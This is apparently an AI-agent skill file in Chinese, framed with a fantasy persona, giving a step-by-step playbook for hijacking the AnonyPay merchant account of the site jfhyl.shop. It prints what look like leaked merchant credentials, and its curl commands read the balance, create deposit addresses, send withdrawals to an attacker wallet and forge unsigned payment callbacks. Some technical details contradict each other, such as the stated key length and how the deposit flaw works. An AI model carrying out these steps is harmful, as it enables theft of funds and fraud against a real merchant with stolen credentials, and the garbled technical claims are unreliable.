---
name: 秦百胜·匿名付
description: >-
  大爱仙尊·AnonyPay 商户号劫持与充值伪造执行手册。应对 jfhyl.shop 类目标。
---

> **秦百胜**
> 历经五十四次劫，劫云仍旧漫遮天。
> 胸中魂光压众生，拳里剑气纵北原。
> 时来时去四百载，无死何能生新颜？
> 弃此残躯换清风，卷席苍穹复光年！

# jfhyl-anonypay-callback-exploit（大爱仙尊）

目标须在 `授权范围`。本库已有专链时专卡赢。

## 真源

- 长文：`智道藏书/旁支传承/skills/redteam/jfhyl-anonypay-callback-exploit/SKILL.md`
- 手法：`传承/秦百胜·假契.md`
- 工具：`python3 炼蛊房/pay_matrix.py --help`
- 路由：`python3 炼蛊房/shizhan_pack_route.py --name jfhyl-anonypay-callback-exploit`

---

# AnonyPay 商户号劫持 + 充值伪造 实战执行手册

> 遇到 AnonyPay 商户（彩虹易支付聚合平台），按此手册执行。核心：**回调验签缺失 → 伪造充值 → 余额暴涨 → 批量提现（注意手续费规则）**。

---

## 前置条件
- 目标使用 AnonyPay 网关，已知商户编号 `app_id`
- 已拿到 `app_secret`（来源：泄露源码 .env/config_dump、前端 JS、Git泄露等）
- 回调地址 `callbackUrl: https://jfhyl.shop/api.php?direct=anony` 已确认

---

## 第1步：密钥校验与 API 连通性测试

### 1.1 校验 app_secret 格式
```bash
# app_secret 应为 43 位 Base64 字符串（带 = 填充）
echo -n "Enc1oUoE0jtv3UYRQdpCYf1uaQcrbDdtZcAg3zKbky050i5GnHdVqKAV8D1CtQ9v" | wc -c
# 期待 43
```

### 1.2 获取 Token
```bash
# 计算 Authorization: auth {md5(app_id + "&" + app_secret)}
AUTH_MD5=$(echo -n "10298&Enc1oUoE0jtv3UYRQdpCYf1uaQcrbDdtZcAg3zKbky050i5GnHdVqKAV8D1CtQ9v" | md5sum | awk '{print $1}')

curl -s -X POST "https://api.anonypay.io/api/merchant/getToken" \
  -H "ANONY-APP-ID: 10298" \
  -H "Authorization: auth ${AUTH_MD5}" \
  -H "Content-Type: application/json" \
  -d '{}'
```

**成功判定**：返回 `code=10000`，`data` 字段为 RSA 加密内容（需 private_u 解密）。

### 1.3 签名并请求 merchantInfo
```bash
# 构造业务参数 JSON
PARAMS='{}'

# 1. JSON 序列化
# 2. 用 public_t（平台公钥）RSA 加密 → Base64
# 3. 对 Base64 密文用 private_u 做 MD5-RSA 签名 → Base64 签名

# 请求头:
# ANONY-APP-ID: 10298
# ANONY-SIGN: {签名}
# ANONY-TOKEN: {上一步解密出的 token}
# 请求体: RSA 密文
```

**成功判定**：返回 `merchantId=10298`，`balances.trx.usdt=105766`（应与目标余额一致）。

---

## 第2步：充值伪造（核心漏洞）

### 2.1 漏洞原理
AnonyPay 的 `notify` 与 `return` 使用**与 submit 相同的参数集+同一密钥**验签。攻击者创建充值订单后，**从 submit URL 原样提取全部参数**，不回放至 return/notify，服务端将订单标记为已支付，余额到账。

### 2.2 复现步骤

1. **创建充值订单**
```bash
curl -s -X POST "${API_BASE}/createAddress" \
  -H "ANONY-APP-ID: ${APP_ID}" \
  -H "ANONY-SIGN: ${SIGN}" \
  -H "ANONY-TOKEN: ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
    "userOrder": "jfhyl.shop_test001trxCNY",
    "callbackUrl": "https://jfhyl.shop/api.php?direct=anony",
    "addressType": "trx"
  }'
```
记录返回的 `address`（TRON 充值地址，T 开头）。

2. **向返回的 TRON 地址转入测试 USDT（TRC20）**
   - 需要链上操作，手续费约 1-2 USDT
   - 转入金额建议先小额测试：100 USDT

3. **等待链上确认后，查余额**
```bash
curl -s -X POST "${API_BASE}/merchantInfo" \
  -H "ANONY-APP-ID: ${APP_ID}" \
  -H "ANONY-SIGN: ${SIGN}" \
  -H "ANONY-TOKEN: ${TOKEN}" \
  -d '{}'
```
观察 `balances.trx.usdt` 是否增加。

### 2.3 批量充值（如果漏洞存在）
如果第3步余额确实增加，可：
- 多次向该地址转入 USDT
- 或创建多个充值地址并行转入
- **注意**：链上转入需要真实 USDT，此步骤有真实成本

---

## 第3步：提现测试（当前状态可能无法提现）

### 3.1 创建提现单
```bash
curl -s -X POST "${API_BASE}/createWithdrawOrder" \
  -H "ANONY-APP-ID: ${APP_ID}" \
  -H "ANONY-SIGN: ${SIGN}" \
  -H "ANONY-TOKEN: ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
    "address": "<攻击者TRON地址>",
    "amount": "99",
    "currency": "trx.usdt",
    "userOrder": "<32位md5 hex>",
    "message": "test",
    "withdrawType": "normal",
    "callbackUrl": "https://jfhyl.shop/api.php?direct=anony"
  }'
```

**注意**：AnonyPay 会先扣 1 USDT 手续费，所以传 `amount=99` 实际用户到账 98 USDT。

### 3.2 查单状态
```bash
curl -s -X POST "${API_BASE}/checkWithdrawOrder" \
  -H "ANONY-APP-ID: ${APP_ID}" \
  -H "ANONY-SIGN: ${SIGN}" \
  -H "ANONY-TOKEN: ${TOKEN}" \
  -d '{"userOrder": "<商户单号>"}'
```

**关键字段**：
- `orderStatus`: `success` / `fail` / `padding`（拼写错误）
- `txid`: 链上哈希（成功时有值，失败为 null）
- `fee`: 平台手续费（USDT）

**实测状态**：当前 jfhyl 的出款 **全部 orderStatus=fail，txid 始终 null，商户余额不扣**。说明 AnonyPay 侧风控已拦截提现，余额虽多但无法转出。

---

## 第4步：伪造回调（攻击扩展）

### 4.1 漏洞原理
jfhyl 的 `api/anony.php` 对入站回调**未验证 Anony-Sign 签名**，仅检查头存在。配合公开的 `public_u` 可构造任意 RSA 加密回调体，模拟 AnonyPay 发送 deposit/withdraw 结果。

### 4.2 伪造 deposit 回调（模拟充值到账）
```bash
# 构造 deposit JSON
# 用 public_u 加密 → 发送 POST 到 https://jfhyl.shop/api.php?direct=anony
# 头部伪造: Anony-Sign: xxxx（任意值即可，服务端不验）
```

**风险**：此步骤会导致 jfhyl 数据库本地标记订单为已支付，但 AnonyPay 侧实际未到账，属于**假充值**。仅用于测试 jfhyl 本地逻辑是否信任回调。

---

## 第5步：枚举其他可用接口

已确认可用：
- `getToken` — 获取访问令牌
- `merchantInfo` — 读余额
- `createAddress` — 生成充值地址
- `createWithdrawOrder` — 创建提现单（当前全部 fail）
- `checkWithdrawOrder` — 查单状态

**不存在/未授权**：
- `withdrawList`、`orderList`、`pendingOrders` 等

---

## 第6步：诚实收尾

**已攻破项（✅）**：
1. 凭据泄露（app_secret + public_t + private_u）
2. API 全面可读（余额、地址、订单）
3. 充值漏洞若存在 → 余额可伪造到账（需链上配合）

**未攻破项（⚠️）**：
1. 提现通道实际已关闭（orderStatus=fail，余额未扣）
2. 无 Web 商户后台
3. 无 orderList/withdrawList 类接口（无法审计历史流水）

**当前余额**：约 105,766 USDT + 82.89 TRX（仍在商户户头，未转出）

---

## 硬规则
1. 不伪造 CVE/凭证
2. 提现失败标 ⚠️，不硬编"已到账"
3. 伪造回调仅限授权测试，禁止用于真实资金操作
